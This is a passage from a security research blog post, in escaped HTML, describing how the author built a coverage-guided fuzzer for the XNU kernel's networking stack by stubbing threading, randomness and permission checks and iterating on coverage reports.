&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; get_fuzzed_bytes&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kernel_addr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;nbytes&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Copyout is designed similarly. We often don&amp;rsquo;t care about the data copied out; we just care about the safety of the accesses. For that reason, we make sure to memcpy from the source buffer in all cases, using a temporary buffer when a copy to &lt;/span&gt;&lt;span class="c9"&gt;(void*)1&lt;/span&gt;&lt;span&gt;&amp;nbsp;occurs. If the kernel copies out of bounds or from freed memory, for example, ASAN will catch it and inform us about a memory disclosure vulnerability.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20 c18" id="h.bydr5qowo002"&gt;&lt;span class="c27 c2"&gt;Synchronization and Threads&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Among the many changes made to XNU&amp;rsquo;s behavior to support this project, perhaps the most extensive and invasive are the changes I made to the synchronization and threading model. Before beginning this project, I had spent over a year working on Chrome browser process research, where high level &amp;ldquo;sequences&amp;rdquo; are &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://chromium.googlesource.com/chromium/src/+/master/docs/threading_and_tasks.md#prefer-sequences-to-physical-threads"&gt;preferred to using physical threads&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Despite a paucity of data races, Chrome still had sequence-related bugs that were triggered by randomly servicing some of the pending work in between performing synchronous IPC calls. In an exploit for a bug found by the &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://source.chromium.org/chromium/chromium/src/+/master:content/browser/appcache/appcache_fuzzer.cc;l=275;drc=db9ae7941adc1d95c943accce9e0151d265fd640"&gt;AppCache fuzzer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c8 c2"&gt;sleep calls were needed to get the asynchronous work to be completed before queueing up some more work synchronously. So I already knew that asynchronous continuation-passing style concurrency could have exploitable bugs that are easy to discover with this fuzzing approach.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;I suspected I could find similar bugs if I used a similar model for sockfuzzer. Because XNU uses multiple kernel threads in its networking stack, I would have to port it to a cooperative style. To do this, I provided no-op implementations for all of the thread management functions and sync primitives, and instead randomly called the work functions that would have been called by the real threads. This involved modifying code: most worker threads run in a loop, processing new work as it comes in. I modified these infinitely looping helper functions to do one iteration of work and exposed them to the fuzzer frontend. Then I called them randomly as part of the protobuf message. The main benefit of doing the project this way was improved performance and determinism. Places where the kernel could block the fuzzer were modified to return early. Overall, it was a lot simpler and easier to manage a single-threaded process. But this decision did not end up yielding as many bugs as I had hoped. For example, I suspected that interleaving garbage collection of various network-related structures with syscalls would be more effective. It did achieve the goal of removing threading-related headaches from deploying the fuzzer, but this is a serious weakness that I would like to address in future fuzzer revisions.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20 c18" id="h.kmj0lqsi4gzm"&gt;&lt;span class="c27 c2"&gt;Randomness&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Randomness is another service provided by kernels to userland (e.g. /dev/random) and in-kernel services requiring it. This is easy to emulate: we can just return as many bytes as were requested from the current test case&amp;rsquo;s &lt;/span&gt;&lt;span class="c9"&gt;data_provider&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;field.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20 c18" id="h.uqavuzi2havy"&gt;&lt;span class="c27 c2"&gt;Authentication&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;XNU features some mechanisms (KAuth, mac checks, user checks) to determine whether a given syscall is permissible. Because of the importance and relative rarity of bugs in XNU, and my willingness to triage false positives, I decided to allow all actions by default. For example, the TCP multipath code requires a special entitlement, but disabling this functionality precludes us from finding Ian&amp;rsquo;s multipath vulnerability. Rather than fuzz only code accessible inside the app sandbox, I figured I would just triage whatever comes up and report it with the appropriate severity in mind.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;For example, when we create a socket, the kernel checks whether the running process is allowed to make a socket of the given domain, type, and protocol provided their KAuth credentials:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.18282f1e8a60e62e63d117b754876dbe5736c0c5"&gt;&lt;/a&gt;&lt;a id="t.21"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;static&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;socket_common&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;proc &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;p&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;domain&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;type&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;protocol&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; pid_t epid&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; int32_t &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;retval&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;delegate&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;socket &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;so&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fileproc &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;fp&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fd&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;error&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; AUDIT_ARG&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;socket&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;domain&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;type&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;protocol&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#if CONFIG_MACF_SOCKET_SUBSET&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;error &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mac_socket_check_create&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kauth_cred_get&lt;/span&gt;&lt;span class="c1"&gt;(),&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;domain&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; type&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;protocol&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;error&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#endif&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* MAC_SOCKET_SUBSET */&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;When we reach this function in our fuzzer, we trigger an assert crash as this functionality was &amp;nbsp;stubbed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.302eee1cbdf895a4dc039cf6ce90b0c2bd2abfd3"&gt;&lt;/a&gt;&lt;a id="t.22"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x7f58f49b53f3 in Assert /source/build3/../fuzz/stubs.c:21:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x7f58f49ba070 in kauth_cred_get /source/build3/../fuzz/fake_impls.c:272:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#8 0x7f58f3c70889 in socket_common /source/build3/../bsd/kern/uipc_syscalls.c:242:39&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#9 0x7f58f3c7043a in socket /source/build3/../bsd/kern/uipc_syscalls.c:214:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#10 0x7f58f49b45e3 in socket_wrapper /source/build3/../fuzz/syscall_wrappers.c:371:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#11 0x4e8598 in TestOneProtoInput(Session const&amp;amp;) /source/build3/../fuzz/net_fuzzer.cc:655:19&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Now, we need to implement &lt;/span&gt;&lt;span class="c9"&gt;kauth_cred_get&lt;/span&gt;&lt;span&gt;. In this case, we return a (void*)1 pointer so that NULL checks on the value will pass (and if it turns out we need to model this correctly, we&amp;rsquo;ll crash again when the pointer is used).&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5e1e8bf64388f5e50d984d841c5a6696fd7eae46"&gt;&lt;/a&gt;&lt;a id="t.23"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;kauth_cred_get&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*)&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Now we crash actually checking the KAuth permissions.&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c32adfdc5da002864f42356336383091ed0936f9"&gt;&lt;/a&gt;&lt;a id="t.24"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x7fbe9219a3f3 in Assert /source/build3/../fuzz/stubs.c:21:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x7fbe9219f100 in mac_socket_check_create /source/build3/../fuzz/fake_impls.c:312:33&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#8 0x7fbe914558a3 in socket_common /source/build3/../bsd/kern/uipc_syscalls.c:242:15&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#9 0x7fbe9145543a in socket /source/build3/../bsd/kern/uipc_syscalls.c:214:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#10 0x7fbe921995e3 in socket_wrapper /source/build3/../fuzz/syscall_wrappers.c:371:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#11 0x4e8598 in TestOneProtoInput(Session const&amp;amp;) /source/build3/../fuzz/net_fuzzer.cc:655:19&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#12 0x4e76c2 in LLVMFuzzerTestOneInput /source/build3/../fuzz/net_fuzzer.cc:631:1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Now we simply return 0 and move on.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.0d0274614707b5c947a1eb6e9d303107416a6c97"&gt;&lt;/a&gt;&lt;a id="t.25"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mac_socket_check_create&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;As you can see, we don&amp;rsquo;t always need to do a lot of work to fake functionality. We can opt for a much simpler model that still gets us the results we want.&lt;br&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.nu1k8a1bgzhy"&gt;&lt;span&gt;Coverage Guided Development&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;We&amp;rsquo;ve paid a sizable initial cost to implement this fuzz target, but we&amp;rsquo;re now entering the longest and most fun stage of the project: iterating and maintaining the fuzzer. We begin by running the fuzzer continuously (in my case, I ensured it could run on ClusterFuzz). A day of work then consists of fetching the latest corpus, running a clang-coverage visualization pass over it, and viewing the report. While initially most of the work involved fixing assertion failures to get the fuzzer working, we now look for silent implementation deficiencies only visible in the coverage reports. A snippet from the report looks like the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;&lt;a href="https://1.bp.blogspot.com/-ki_QkAHi5cg/YH2p2tko7GI/AAAAAAAAa2Y/OMvfDEM6RT84m037bz6p1joFLG_l8qeVwCNcBGAsYHQ/s600/image4.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-ki_QkAHi5cg/YH2p2tko7GI/AAAAAAAAa2Y/OMvfDEM6RT84m037bz6p1joFLG_l8qeVwCNcBGAsYHQ/s600/image4.png" border="0" alt="Several lines of code have a column indicating that they have been covered tens of thousands of times. Below them, you can see a switch statement for handling the parsing of IP options. Only the default case is covered approximately fifty thousand times, while the routing record options are covered 0 times." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;This excerpt from IP option handling shows that we don&amp;rsquo;t support the various packets well with the current version of the fuzzer and grammar. Having this visualization is enormously helpful and necessary to succeed, as it is a source of truth about your fuzz target. By directing development work around these reports, it&amp;rsquo;s relatively easy to plan actionable and high-value tasks around the fuzzer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;I like to think about improving a fuzz target by either improving &amp;ldquo;soundness&amp;rdquo; or &amp;ldquo;completeness.&amp;rdquo; Logicians probably wouldn&amp;rsquo;t be happy with how I&amp;rsquo;m loosely using these terms, but they are a good metaphor for the task. To start with, we can improve the completeness of a given fuzz target by helping it reach code that we know to be reachable based on manual review. In the above example, I would suspect very strongly that the uncovered option handling code is reachable. But despite a long fuzzing campaign, these lines are uncovered, and therefore our fuzz target is incomplete, somehow unable to generate inputs reaching these lines. There are two ways to get this needed coverage: in a top-down or bottom-up fashion. Each has its tradeoffs. The top-down way to cover this code is to improve the existing grammar or C++ code to make it possible or more likely. The bottom-up way is to modify the code in question. For example, we could replace &lt;/span&gt;&lt;span class="c9"&gt;switch (opt)&lt;/span&gt;&lt;span&gt;&amp;nbsp;with something like &lt;/span&gt;&lt;span class="c9"&gt;switch (global_fuzzed_data-&amp;gt;ConsumeRandomEnum(valid_enums)&lt;/span&gt;&lt;span class="c8 c2"&gt;. This bottom-up approach introduces unsoundness, as maybe these enums could never have been selected at this point. But this approach has often led to interesting-looking crashes that encouraged me to revert the change and proceed with the more expensive top-down implementation. When it&amp;rsquo;s one researcher working against potentially hundreds of thousands of lines, you need tricks to prioritize your work. By placing many cheap bets, you can revert later for free and focus on the most fruitful areas.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;Improving soundness is the other side of the coin here. I&amp;rsquo;ve just mentioned reverting unsound changes and moving those changes out of the target code and into the grammar. But our fake objects are also simple models for how their real implementations behave. If those models are too simple or directly inaccurate, we may either miss bugs or introduce them. I&amp;rsquo;m comfortable missing some bugs as I think these simple fakes enable better coverage, and it&amp;rsquo;s a net win. But sometimes, I&amp;rsquo;ll observe a crash or failure to cover some code because of a faulty model. So improvements can often come in the form of making these fakes better.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;All in all, there is plenty of work that can be done at any given point. Fuzzing isn&amp;rsquo;t an all or nothing one-shot endeavor for large targets like this. This is a continuous process, and as time goes on, easy gains become harder to achieve as most bugs detectable with this approach are found, and eventually, there comes a natural stopping point. But despite working on this project for several months, it&amp;rsquo;s remarkably far from the finish line despite producing several useful bug reports. The cool thing about fuzzing in this way is that it is a bit like excavating a fossil. Each target is different; we make small changes to the fuzzer, tapping away at the target with a chisel each day and letting our coverage metrics, not our biases, reveal the path forward.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c26 c23" id="h.rxgvq2murgo6"&gt;&lt;span class="c27 c2"&gt;Packet Delivery&lt;/span&gt;&lt;/h1&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;I&amp;rsquo;d like to cover one example to demonstrate the value of the &amp;ldquo;bottom-up&amp;rdquo; unsound modification, as in some cases, the unsound modification is dramatically cheaper than the grammar-based one. Disabling hash checks is a well-known fuzzer-only modification when fuzzer-authors know that checksums could be trivially generated by hand. But it can also be applied in other places, such as packet delivery.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;When an mbuf containing a TCP packet arrives, it is handled by &lt;/span&gt;&lt;span class="c9"&gt;tcp_input&lt;/span&gt;&lt;span class="c8 c2"&gt;. In order for almost anything meaningful to occur with this packet, it must be matched by IP address and port to an existing process control block (PCB) for that connection, as seen below.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.59f43b4f2ff0c1f12bb616ac7f9a7c91aabcf10b"&gt;&lt;/a&gt;&lt;a id="t.26"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;tcp_input&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mbuf &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;m&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;off0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;// ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;isipv6&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; inp &lt;/span&gt;&lt;span 